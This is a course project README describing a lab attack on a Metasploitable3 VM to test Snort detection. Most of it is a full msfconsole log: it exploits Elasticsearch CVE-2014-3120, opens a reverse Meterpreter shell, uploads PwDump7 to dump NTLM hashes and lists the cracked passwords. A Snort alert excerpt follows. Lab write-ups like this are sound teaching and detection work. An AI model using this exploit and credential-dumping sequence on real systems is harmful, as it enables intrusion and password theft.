# CyberSecurity-Project-II
Mooc Project

Overview of the procedure to follow can be found in the "Is it easier to fix the applicationa than to detect attacks.docx" file, which is the more readable version of my essay.
You can clone the repository or download the zip. I have put a snort directory in the Virtual Machine network share and the snort1.bat and snort2.bat files refer to that directory. That way, I could more easily work on my Ubuntu 17.10 desktop in msfconsole and edit rules files, the wsnort.conf etc... . wsnort.conf is the windows snort.conf file and has the right slashes etc... .
The first commit has the rules file and wsnort.conf so that the attacks generate alerts. The fifth and sixth commits have rules files and wsnort.conf that generate no alerts. The diff clearly shows which changes are necessary to eliminate the alerts

Software versions used:
- snort on the Virtual Machine: Snort_2_9_11_1_Installer
- winpcap on the Virtual Machine: WinPcap_4_1_3
- metasploit: Framework: 4.16.40-dev- ; Console : 4.16.40-dev-
- nmap: Nmap version 7.60 ( https://nmap.org )

Network setup: Virtualbox gave me a vboxnet0 and vboxnet1 ethernet. The VM was reachable on 172.28.128.3. A second networkcard seemed to only receive on 10.0.2.15. My desktop was on 172.28.128.4.

# More detailed instructions for reproducing the attacks
Available upon request. Once you know the exploits to use in msfconsole, the main thing is to set LHOST, RHOST and the PORTS.

Example of the Elasticsearch vulnerability and password decoding:

```
search cve:2014-3120 

 

Matching Modules 

================ 

 

   Name                                         Disclosure Date  Rank       Description 

   ----                                         ---------------  ----       ----------- 

   exploit/multi/elasticsearch/script_mvel_rce  2013-12-09       excellent  ElasticSearch Dynamic Script Arbitrary Java Execution 

 

 

msf exploit(multi/http/tomcat_mgr_deploy) > use exploit/multi/elasticsearch/script_mvel_rce 

msf exploit(multi/elasticsearch/script_mvel_rce) > show options 

 

Module options (exploit/multi/elasticsearch/script_mvel_rce): 

 

   Name         Current Setting  Required  Description 

   ----         ---------------  --------  ----------- 

   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...] 

   RHOST                         yes       The target address 

   RPORT        9200             yes       The target port (TCP) 

   SSL          false            no        Negotiate SSL/TLS for outgoing connections 

   TARGETURI    /                yes       The path to the ElasticSearch REST API 

   VHOST                         no        HTTP server virtual host 

   WritableDir  /tmp             yes       A directory where we can write files (only for *nix environments) 

 

 

Exploit target: 

 

   Id  Name 

   --  ---- 

   0   ElasticSearch 1.1.1 / Automatic 

 

 

msf exploit(multi/elasticsearch/script_mvel_rce) > set rhost 172.28.128.3 

rhost => 172.28.128.3 

msf exploit(multi/elasticsearch/script_mvel_rce) > run 

 

[*] Started reverse TCP handler on 172.28.128.4:4444  

[*] Trying to execute arbitrary Java... 

[*] Discovering remote OS... 

[+] Remote OS is 'Windows Server 2008 R2' 

[*] Discovering TEMP path 

[+] TEMP path identified: 'C:\Windows\TEMP\' 

[*] Sending stage (53859 bytes) to 172.28.128.3 

[*] Meterpreter session 3 opened (172.28.128.4:4444 -> 172.28.128.3:64192) at 2018-02-25 15:42:03 +0100 

[!] This exploit may require manual cleanup of 'C:\Windows\TEMP\wBYmd.jar' on the target 

 

meterpreter > getuid 

Server username: METASPLOITABLE3$ 

meterpreter > pwd 

C:\Program Files\elasticsearch-1.1.1 

meterpreter > cd ..\..\.. 

meterpreter > ls 

Listing: C:\Program Files\elasticsearch-1.1.1\ 

============================================== 

 

Mode              Size   Type  Last modified              Name 

----              ----   ----  -------------              ---- 

100776/rwxrwxrw-  11358  fil   2014-02-12 18:35:54 +0100  LICENSE.txt 

100776/rwxrwxrw-  150    fil   2014-03-26 00:38:22 +0100  NOTICE.txt 

100776/rwxrwxrw-  8093   fil   2014-03-26 00:38:22 +0100  README.textile 

40776/rwxrwxrw-   4096   dir   2014-04-17 00:28:54 +0200  bin 

40776/rwxrwxrw-   0      dir   2014-04-17 00:28:54 +0200  config 

40776/rwxrwxrw-   0      dir   2018-02-21 16:04:59 +0100  data 

40776/rwxrwxrw-   8192   dir   2014-04-17 00:28:54 +0200  lib 

40776/rwxrwxrw-   4096   dir   2018-02-23 09:58:32 +0100  logs 

 

meterpreter > cd .. 

meterpreter > ls 

Listing: C:\Program Files 

========================= 

 

Mode              Size  Type  Last modified              Name 

----              ----  ----  -------------              ---- 

40776/rwxrwxrw-   4096  dir   2018-02-23 07:39:47 +0100  7-Zip 

40776/rwxrwxrw-   0     dir   2018-02-21 15:50:46 +0100  Apache Software Foundation 

40776/rwxrwxrw-   0     dir   2009-07-14 05:20:08 +0200  Common Files 

40776/rwxrwxrw-   4096  dir   2010-11-21 04:33:05 +0100  Internet Explorer 

40776/rwxrwxrw-   0     dir   2018-02-21 15:50:33 +0100  Java 

40776/rwxrwxrw-   4096  dir   2018-02-21 17:23:21 +0100  Notepad++ 

40776/rwxrwxrw-   4096  dir   2018-02-21 15:41:24 +0100  OpenSSH 

40776/rwxrwxrw-   0     dir   2018-02-21 15:45:17 +0100  Oracle 

40776/rwxrwxrw-   4096  dir   2018-02-21 15:55:52 +0100  Rails_Server 

40777/rwxrwxrwx   0     dir   2009-07-14 07:06:59 +0200  Uninstall Information 

40776/rwxrwxrw-   0     dir   2010-11-21 04:33:05 +0100  Windows Mail 

40776/rwxrwxrw-   0     dir   2009-07-14 07:37:10 +0200  Windows NT 

40776/rwxrwxrw-   0     dir   2018-02-21 15:45:29 +0100  WindowsPowerShell 

100777/rwxrwxrwx  174   fil   2009-07-14 06:57:55 +0200  desktop.ini 

40776/rwxrwxrw-   4096  dir   2018-02-21 16:04:59 +0100  elasticsearch-1.1.1 

40776/rwxrwxrw-   0     dir   1970-01-01 01:00:00 +0100  jenkins 

40776/rwxrwxrw-   4096  dir   2018-02-21 15:53:16 +0100  jmx 

40776/rwxrwxrw-   0     dir   2018-02-21 15:53:01 +0100  wordpress 

 

meterpreter > cd .. 

meterpreter > ls 

Listing: C:\ 

============ 

 

Mode              Size        Type  Last modified              Name 

----              ----        ----  -------------              ---- 

40777/rwxrwxrwx   0           dir   2009-07-14 04:34:39 +0200  $Recycle.Bin 

100555/r-xr-xr-x  8192        fil   2018-02-22 00:36:46 +0100  BOOTSECT.BAK 

40777/rwxrwxrwx   4096        dir   2018-02-22 00:36:46 +0100  Boot 

40776/rwxrwxrw-   4096        dir   2018-02-24 15:25:22 +0100  Documents and Settings 

40776/rwxrwxrw-   0           dir   2018-02-21 16:02:42 +0100  ManageEngine 

40776/rwxrwxrw-   0           dir   2009-07-14 05:20:08 +0200  PerfLogs 

40776/rwxrwxrw-   4096        dir   2018-02-21 17:23:20 +0100  Program Files 

40776/rwxrwxrw-   0           dir   2018-02-21 17:18:44 +0100  Program Files (x86) 

40777/rwxrwxrwx   4096        dir   2018-02-21 15:48:53 +0100  ProgramData 

40777/rwxrwxrwx   0           dir   2018-02-22 00:37:55 +0100  Recovery 

40776/rwxrwxrw-   0           dir   2018-02-21 15:53:51 +0100  RubyDevKit 

40776/rwxrwxrw-   4096        dir   2018-02-23 10:18:40 +0100  Snort 

40776/rwxrwxrw-   0           dir   2018-02-21 15:49:03 +0100  Sun 

40777/rwxrwxrwx   4096        dir   2018-02-22 00:37:14 +0100  System Volume Information 

40776/rwxrwxrw-   4096        dir   2018-02-24 15:25:22 +0100  Users 

40776/rwxrwxrw-   16384       dir   2018-02-21 16:05:34 +0100  Windows 

100776/rwxrwxrw-  226         fil   2015-10-08 04:22:24 +0200  __Argon__.tmp 

100555/r-xr-xr-x  383786      fil   2010-11-21 04:24:02 +0100  bootmgr 

100776/rwxrwxrw-  1971712     fil   2018-02-20 17:54:05 +0100  community-rules 

40776/rwxrwxrw-   0           dir   2018-02-21 15:51:15 +0100  glassfish 

100776/rwxrwxrw-  0           fil   2018-02-21 16:05:37 +0100  jack_of_diamonds.png 

100776/rwxrwxrw-  103         fil   2018-02-21 16:04:20 +0100  java0.log 

100776/rwxrwxrw-  103         fil   2018-02-21 16:04:20 +0100  java1.log 

100776/rwxrwxrw-  103         fil   2018-02-21 16:04:20 +0100  java2.log 

40776/rwxrwxrw-   0           dir   2018-02-21 15:53:14 +0100  openjdk6 

100001/--------x  3058540544  fil   1970-01-01 01:00:00 +0100  pagefile.sys 

40776/rwxrwxrw-   0           dir   2018-02-21 16:19:44 +0100  tmp 

40776/rwxrwxrw-   0           dir   2018-02-21 15:53:25 +0100  tools 

40776/rwxrwxrw-   4096        dir   2018-02-21 15:52:55 +0100  wamp 

 

meterpreter > cd tmp 

meterpreter > ls 

Listing: C:\tmp 

=============== 

 

Mode              Size  Type  Last modified              Name 

----              ----  ----  -------------              ---- 

100776/rwxrwxrw-  2273  fil   2018-02-21 16:19:59 +0100  vagrant-shell.bat 

 

meterpreter > upload /home/pstevens/metasploitable3/atk/pwdump7/* 

[-] Error running command upload: Errno::ENOENT No such file or directory @ rb_file_s_stat - /home/pstevens/metasploitable3/atk/pwdump7/* 

meterpreter > upload /home/pstevens/metasploitable3/atk/pwdump7/libeay32.dll 

[*] uploading  : /home/pstevens/metasploitable3/atk/pwdump7/libeay32.dll -> libeay32.dll 

[*] Uploaded -1.00 B of 993.50 KiB (0.0%): /home/pstevens/metasploitable3/atk/pwdump7/libeay32.dll -> libeay32.dll 

[*] uploaded   : /home/pstevens/metasploitable3/atk/pwdump7/libeay32.dll -> libeay32.dll 

meterpreter > upload /home/pstevens/metasploitable3/atk/pwdump7/PwDump7.exe 

[*] uploading  : /home/pstevens/metasploitable3/atk/pwdump7/PwDump7.exe -> PwDump7.exe 

[*] Uploaded -1.00 B of 76.00 KiB (-0.0%): /home/pstevens/metasploitable3/atk/pwdump7/PwDump7.exe -> PwDump7.exe 

[*] uploaded   : /home/pstevens/metasploitable3/atk/pwdump7/PwDump7.exe -> PwDump7.exe 

meterpreter > dir 

Listing: C:\tmp 

=============== 

 

Mode              Size     Type  Last modified              Name 

----              ----     ----  -------------              ---- 

100776/rwxrwxrw-  77824    fil   2018-02-25 15:44:36 +0100  PwDump7.exe 

100776/rwxrwxrw-  1017344  fil   2018-02-25 15:44:26 +0100  libeay32.dll 

100776/rwxrwxrw-  2273     fil   2018-02-21 16:19:59 +0100  vagrant-shell.bat 

 

meterpreter > shell 

Process 2 created. 

Channel 4 created. 

Microsoft Windows [Version 6.1.7601] 

Copyright (c) 2009 Microsoft Corporation.  All rights reserved. 

 

C:\Program Files\elasticsearch-1.1.1>c:\tmp 

c:\tmp 

'c:\tmp' is not recognized as an internal or external command, 

operable program or batch file. 

 

C:\Program Files\elasticsearch-1.1.1>cd c:\tmp 

cd c:\tmp 

 

c:\tmp>dir 

dir 

 Volume in drive C is Windows 2008R2 

 Volume Serial Number is 28A3-B641 

 

 Directory of c:\tmp 

 

02/25/2018  03:44 PM    <DIR>          . 

02/25/2018  03:44 PM    <DIR>          .. 

02/25/2018  03:44 PM         1,017,344 libeay32.dll 

02/25/2018  03:44 PM            77,824 PwDump7.exe 

02/21/2018  04:19 PM             2,273 vagrant-shell.bat 

               3 File(s)      1,097,441 bytes 

               2 Dir(s)  47,032,672,256 bytes free 

 

c:\tmp>PwDump7.exe 

PwDump7.exe 

Pwdump v7.1 - raw password extractor 

Author: Andres Tarasco Acuna 

url: http://www.514.es 

 

Administrator:500:NO PASSWORD*********************:E02BC503339D51F71D913C245D35B50B::: 

Guest:501:NO PASSWORD*********************:NO PASSWORD*********************::: 

vagrant:1000:NO PASSWORD*********************:E02BC503339D51F71D913C245D35B50B::: 

sshd:1001:NO PASSWORD*********************:NO PASSWORD*********************::: 

sshd_server:1002:NO PASSWORD*********************:8D0A16CFC061C3359DB455D00EC27035::: 

leia_organa:1004:NO PASSWORD*********************:8AE6A810CE203621CF9CFA6F21F14028::: 

luke_skywalker:1005:NO PASSWORD*********************:481E6150BDE6998ED22B0E9BAC82005A::: 

han_solo:1006:NO PASSWORD*********************:33ED98C5969D05A7C15C25C99E3EF951::: 

artoo_detoo:1007:NO PASSWORD*********************:FAC6AADA8B7AFC418B3AFEA63B7577B4::: 

c_three_pio:1008:NO PASSWORD*********************:0FD2EB40C4AA690171BA066C037397EE::: 

ben_kenobi:1009:NO PASSWORD*********************:4FB77D816BCE7AEEE80D7C2E5E55C859::: 

darth_vader:1010:NO PASSWORD*********************:B73A851F8ECFF7ACAFBAA4A806AEA3E0::: 

anakin_skywalker:1011:NO PASSWORD*********************:C706F83A7B17A0230E55CDE2F3DE94FA::: 

jarjar_binks:1012:NO PASSWORD*********************:EC1DCD52077E75AEF4A1930B0917C4D4::: 

lando_calrissian:1013:NO PASSWORD*********************:62708455898F2D7DB11CFB670042A53F::: 

boba_fett:1014:NO PASSWORD*********************:D60F9A4859DA4FEADAF160E97D200DC9::: 

jabba_hutt:1015:NO PASSWORD*********************:93EC4EAA63D63565F37FE7F28D99CE76::: 

greedo:1016:NO PASSWORD*********************:CE269C6B7D9E2F1522B44686B49082DB::: 

chewbacca:1017:NO PASSWORD*********************:E7200536327EE731C7FE136AF4575ED8::: 

kylo_ren:1018:NO PASSWORD*********************:74C0A3DD06613D3240331E94AE18B001::: 

 

c:\tmp> 
```
Pasting the hashed passwords (NTLM) into https://hashkiller.co.uk/ntlm-decrypter.aspx gives:
```
e02bc503339d51f71d913c245d35b50b NTLM : vagrant
8d0a16cfc061c3359db455d00ec27035 NTLM : D@rj33l1ng
8ae6a810ce203621cf9cfa6f21f14028 [Not found]
481e6150bde6998ed22b0e9bac82005a NTLM : use_the_f0rce
33ed98c5969d05a7c15c25c99e3ef951 NTLM : sh00t-first
fac6aada8b7afc418b3afea63b7577b4 NTLM : beep_b00p
0fd2eb40c4aa690171ba066c037397ee NTLM : pr0t0c0l
4fb77d816bce7aeee80d7c2e5e55c859 NTLM : thats_no_moon
b73a851f8ecff7acafbaa4a806aea3e0 NTLM : d@rk_sid3
c706f83a7b17a0230e55cde2f3de94fa NTLM : yipp33!!
ec1dcd52077e75aef4a1930b0917c4d4 [Not found]
62708455898f2d7db11cfb670042a53f NTLM : b@ckstab
d60f9a4859da4feadaf160e97d200dc9 NTLM : mandalorian1
93ec4eaa63d63565f37fe7f28d99ce76 [Not found]
ce269c6b7d9e2f1522b44686b49082db NTLM : hanShotFirst!
e7200536327ee731c7fe136af4575ed8 NTLM : rwaaaaawr5
74c0a3dd06613d3240331e94ae18b001 NTLM : daddy_issues1
```
So, all but 3 passwords were cracked.

And snort2 output from this attack:
```
Commencing packet processing (pid=8736) 

02/25-21:14:05.374761  [**] [129:12:1] Consecutive TCP small segments exceeding 

threshold [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 172 

.28.128.4:4444 -> 172.28.128.3:52623 

02/25-21:14:05.486733  [**] [129:12:1] Consecutive TCP small segments exceeding 

threshold [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 172 

.28.128.4:4444 -> 172.28.128.3:52623 

02/25-21:14:05.631376  [**] [129:12:1] Consecutive TCP small segments exceeding 

threshold [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 172 

.28.128.4:4444 -> 172.28.128.3:52623 

02/25-21:14:05.718327  [**] [129:12:1] Consecutive TCP small segments exceeding 

threshold [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 172 

.28.128.4:4444 -> 172.28.128.3:52623 
```
